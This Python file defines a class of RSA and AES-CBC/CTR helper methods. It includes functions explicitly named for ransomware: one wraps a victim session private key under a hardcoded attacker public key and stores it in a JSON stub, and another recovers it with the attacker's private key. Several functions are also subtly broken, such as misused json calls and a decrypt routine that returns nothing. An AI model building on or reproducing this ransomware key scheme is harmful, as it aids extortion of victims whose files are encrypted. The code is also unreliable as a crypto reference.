from base64 import b64encode, b64decode
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from json import dump, loads


class CryptoBB:

    def __init__(self):
         return

    
    def gen_der_rsa_keypair(self):
        
        keys = RSA.generate(2048) # change to desired bit length
        sess_privkey = keys.export_key('DER')
        sess_pubkey = keys.publickey().export_key('DER')

        return sess_privkey, sess_pubkey
    

    def gen_pem_rsa_keypair(self):
         
         keys = RSA.generate(2048)
         sess_privkey = keys.export_key('PEM')
         sess_pubkey = keys.publickey().export_key('PEM')

         return sess_privkey, sess_pubkey


    def load_rsa_pubkey(self, rsa_pubkey):

            key = b64decode(rsa_pubkey)
            rsa_key = RSA.import_key(key)

            return rsa_key


    def rsa_wrap_aes(self, rsa_pubkey, aes_key):
        
        cipher_rsa = PKCS1_OAEP.new(rsa_pubkey)
        cipher_text = cipher_rsa.encrypt(aes_key)
        
        rsa_ct = b64encode(cipher_text).decode('utf-8')

        return rsa_ct
    

    def rsa_decrypt(self, rsa_privkey, enc_data):

        cipher_rsa = PKCS1_OAEP.new(rsa_privkey)
        sess_key = cipher_rsa.decrypt(enc_data)

        return sess_key


    def aescbc_encrypt(self, rsa_pubkey, data_to_encrypt):

        sess_aeskey = get_random_bytes(16)
        cipher = AES.new(sess_aeskey, AES.MODE_CBC) 
        cipher_text = cipher.encrypt(pad(data_to_encrypt, AES.block_size))
        
        aes_ct = b64encode(cipher_text).decode('utf-8')
        iv = b64encode(cipher.iv).decode('utf-8')

        rsa_ct = self.rsa_wrap_aes(rsa_pubkey, sess_aeskey)

        return rsa_ct, aes_ct, iv
    

    def aescbc_decrypt(self, aes_key, iv, enc_data):
        
        try:
            iv = b64decode(iv)
            aes_key = b64decode(aes_key)
            
            cipher = AES.new(aes_key, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(enc_data), AES.block_size)

            return pt
        
        except (ValueError, KeyError):
            print("Incorrect decryption")


    def aesctr_encrypt(self, rsa_pubkey, encrypt_me):

        new_aeskey = get_random_bytes(16)

        rsa_ct = self.rsa_wrap_aes(rsa_pubkey, new_aeskey)

        cipher = AES.new(new_aeskey, AES.MODE_CTR)
        aes_ct = cipher.encrypt(encrypt_me)
        nonce = b64encode(cipher.nonce).decode('utf-8')

        return rsa_ct, aes_ct, nonce
    

    def aesctr_decrypt(self, aes_key, nonce, ct):

        try:
            cipher = AES.new(aes_key, AES.MODE_CTR, nonce=nonce)
            pt = cipher.decrypt(ct)

        except (ValueError, KeyError):

            print("Incorrect decryption")
        

    def generate_ransomware_session_keys(self, rsa_pubkey):
        """Takes one argument: An RSA public key, which should be hardcoded.
        Generates a new session RSA keypair and encrypts the private key in memory 
        with AES wrapped in RSA. Creates a JSON database to output the information
        necessary for decryption. Returns the session public key."""
        file_path = '/path/to/json_database.json'

        keys = RSA.generate(2048)
        sess_privkey = keys.export_key('DER')
        sess_pubkey = keys.publickey().export_key('DER')

        enc_rsa_privkey, enc_aes_key, iv = self.aescbc_encrypt(rsa_pubkey, sess_privkey)
        db_stub = {'stub': {'rsa_privkey': enc_rsa_privkey, 
                                'aescbc_key': enc_aes_key,
                                'aescbc_iv': iv}}

        with open(file_path, 'w') as f:
            f.write(dump(db_stub))

        rsa_key = RSA.import_key(sess_pubkey)
        
        return rsa_key
    
    def decrypt_session_privkey(self, rsa_privkey, path_to_json_db):

        with open(path_to_json_db, 'r') as f:
            data = loads(f)

        enc_sess_privkey = data['stub']['rsa_privkey']
        enc_aeskey = data['stub']['aescbc_key']
        print(enc_aeskey)
        iv = data['stub']['aescbc_iv']
        print(iv)

        atkr_privkey = self.load_rsa_pubkey(rsa_privkey)
        cipher_rsa = PKCS1_OAEP.new(atkr_privkey)
        sess_aeskey = cipher_rsa.decrypt(enc_aeskey)

        sess_rsa_privkey = self.aescbc_decrypt(sess_aeskey, iv, enc_sess_privkey)
        
        return sess_rsa_privkey
